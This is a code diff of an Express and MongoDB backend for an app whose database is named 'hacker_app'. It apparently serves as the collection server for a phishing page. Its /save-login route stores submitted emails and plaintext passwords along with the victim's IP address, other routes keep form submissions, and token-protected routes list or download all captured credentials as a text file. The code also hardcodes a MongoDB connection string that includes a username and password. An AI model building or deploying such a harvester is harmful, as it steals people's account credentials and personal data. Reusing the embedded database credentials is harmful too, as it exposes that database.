@@ -1,3 +1,5 @@
+// backend/server.js
+require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
@@ -9,140 +11,127 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
+// simple request logger for debugging (prints method, path, body)
+app.use((req, res, next) => {
+  console.log(`[REQ] ${new Date().toISOString()} ${req.method} ${req.path} body=${JSON.stringify(req.body)}`);
+  next();
+});
+
 // Serve static files (optional)
 app.use(express.static(path.join(__dirname, '../')));
 
-//
-// ✅ STEP 1: Connect to MongoDB Atlas (using hacker_app database)
-//
-const MONGO_URI = "mongodb+srv://samsmollett:adikah1234@cluster0.s8ofap9.mongodb.net/hacker_app?retryWrites=true&w=majority";
+// ---------- MongoDB connection (explicit hacker_app DB) ----------
+const MONGO_URI = process.env.MONGO_URI ||
+  "mongodb+srv://samsmollett:adikah1234@cluster0.s8ofap9.mongodb.net/hacker_app?retryWrites=true&w=majority";
 
-mongoose.connect(MONGO_URI)
+mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
   .then(() => console.log("✅ Connected to MongoDB Atlas (hacker_app)"))
   .catch((err) => console.error("❌ MongoDB connection error:", err));
 
-//
-// ✅ STEP 2: Define Schemas and Models
-//
+// ---------- Schemas / models ----------
 const loginSchema = new mongoose.Schema({
   email: String,
   password: String,
-  createdAt: { type: Date, default: Date.now }
+  createdAt: { type: Date, default: Date.now },
+  ip: String
 });
-
 const applicationSchema = new mongoose.Schema({
   form: Object,
-  createdAt: { type: Date, default: Date.now }
+  createdAt: { type: Date, default: Date.now },
+  ip: String
 });
 
 const Login = mongoose.model('Login', loginSchema);
 const Application = mongoose.model('Application', applicationSchema);
 
-//
-// ✅ STEP 3: Save login info to MongoDB
-//
+// helper to pick client ip (works behind proxies)
+function getClientIp(req) {
+  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
+}
+
+// ---------- Routes ----------
+
+// Save login info
 app.post('/save-login', async (req, res) => {
   const { email, password } = req.body;
-  if (!email || !password)
+  console.log(`[SAVE-LOGIN] received: email=${email ? email : '[no-email]'} passwordPresent=${!!password}`);
+  if (!email || !password) {
+    console.log('[SAVE-LOGIN] missing fields');
     return res.status(400).send({ error: 'Missing email or password' });
+  }
 
   try {
-    await Login.create({ email, password });
-    console.log(`[LOGIN SAVED] ${new Date().toISOString()} email=${email}`);
-    res.send({ status: 'ok' });
+    const ip = getClientIp(req);
+    const doc = await Login.create({ email, password, ip });
+    console.log(`[LOGIN SAVED] ${new Date().toISOString()} id=${doc._id} email=${doc.email} ip=${ip}`);
+    return res.send({ status: 'ok', id: doc._id });
   } catch (err) {
     console.error("❌ Error saving login:", err);
-    res.status(500).send({ error: 'Database error' });
+    return res.status(500).send({ error: 'Database error' });
   }
 });
 
-//
-// ✅ STEP 4: Save application form to MongoDB
-//
+// Save application form
 app.post('/save-application', async (req, res) => {
   try {
-    await Application.create({ form: req.body });
-    console.log("[APPLICATION SAVED]");
-    res.send({ status: 'ok' });
+    console.log('[SAVE-APPLICATION] body:', JSON.stringify(req.body));
+    const ip = getClientIp(req);
+    const doc = await Application.create({ form: req.body, ip });
+    console.log(`[APPLICATION SAVED] ${new Date().toISOString()} id=${doc._id} ip=${ip}`);
+    return res.send({ status: 'ok', id: doc._id });
   } catch (err) {
     console.error("❌ Error saving application:", err);
-    res.status(500).send({ error: 'Database error' });
+    return res.status(500).send({ error: 'Database error' });
   }
 });
 
-//
-// ✅ STEP 5: View saved logins
-//
+// Admin JSON views (protected by token)
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin-token-placeholder';
+
 app.get('/logins', async (req, res) => {
-  try {
-    const logins = await Login.find().sort({ createdAt: -1 });
-    const formatted = logins.map(l => `Email: ${l.email}, Password: ${l.password}`).join('\n');
-    res.send(`<pre>${formatted}</pre>`);
-  } catch (err) {
-    res.status(500).send('Error loading logins');
-  }
+  const token = req.headers['x-admin-token'] || req.query.token;
+  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return res.status(401).send('Unauthorized');
+  const docs = await Login.find().sort({ createdAt: -1 }).limit(500).lean();
+  return res.json(docs);
 });
 
-//
-// ✅ STEP 6: View saved applications
-//
 app.get('/applications', async (req, res) => {
-  try {
-    const apps = await Application.find().sort({ createdAt: -1 });
-    res.send(`<pre>${JSON.stringify(apps, null, 2)}</pre>`);
-  } catch (err) {
-    res.status(500).send('Error loading applications');
-  }
+  const token = req.headers['x-admin-token'] || req.query.token;
+  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return res.status(401).send('Unauthorized');
+  const docs = await Application.find().sort({ createdAt: -1 }).limit(500).lean();
+  return res.json(docs);
 });
 
-//
-// ✅ STEP 7: Secure admin-only download route
-//
-const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
-
+// Admin download (protected)
 app.get('/admin/download-login-file', async (req, res) => {
   const token = req.headers['x-admin-token'] || req.query.token;
-  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) {
-    return res.status(401).send('Unauthorized');
-  }
-
-  try {
-    const logins = await Login.find().sort({ createdAt: -1 });
-    const content = logins.map(l => `Email: ${l.email}, Password: ${l.password}`).join('\n');
-    res.setHeader('Content-Disposition', 'attachment; filename=logins.txt');
-    res.setHeader('Content-Type', 'text/plain');
-    res.send(content);
-  } catch (err) {
-    console.error('❌ Error generating file:', err);
-    res.status(500).send('Server error');
-  }
+  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return res.status(401).send('Unauthorized');
+  const logins = await Login.find().sort({ createdAt: -1 }).lean();
+  const content = logins.map(l => `Email: ${l.email}, Password: ${l.password}, createdAt:${l.createdAt}`).join('\n');
+  res.setHeader('Content-Disposition', 'attachment; filename=logins.txt');
+  res.setHeader('Content-Type', 'text/plain');
+  res.send(content);
 });
 
-//
-// ✅ STEP 8: Debug route to view MongoDB data in console
-//
+// Debug route to print current DB entries in logs
 app.get('/debug', async (req, res) => {
   try {
-    const logins = await Login.find().sort({ createdAt: -1 });
-    const applications = await Application.find().sort({ createdAt: -1 });
-
-    console.log("---- LOGINS ----");
-    console.log(logins);
-
-    console.log("---- APPLICATIONS ----");
-    console.log(applications);
-
-    res.send({ status: 'ok', message: 'Check server logs for MongoDB data' });
+    const logins = await Login.find().sort({ createdAt: -1 }).limit(200).lean();
+    const applications = await Application.find().sort({ createdAt: -1 }).limit(200).lean();
+    console.log('---- LOGINS ----');
+    console.log(JSON.stringify(logins, null, 2));
+    console.log('---- APPLICATIONS ----');
+    console.log(JSON.stringify(applications, null, 2));
+    return res.send({ status: 'ok', message: 'Check server logs for MongoDB data' });
   } catch (err) {
-    console.error("❌ Error fetching data:", err);
-    res.status(500).send({ error: 'Database error' });
+    console.error('❌ Error fetching data:', err);
+    return res.status(500).send({ error: 'Database error' });
   }
 });
 
-//
-// ✅ STEP 9: Start the server
-//
-app.listen(3000, () => console.log('✅ Server running at http://localhost:3000'));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
+
 
 
 
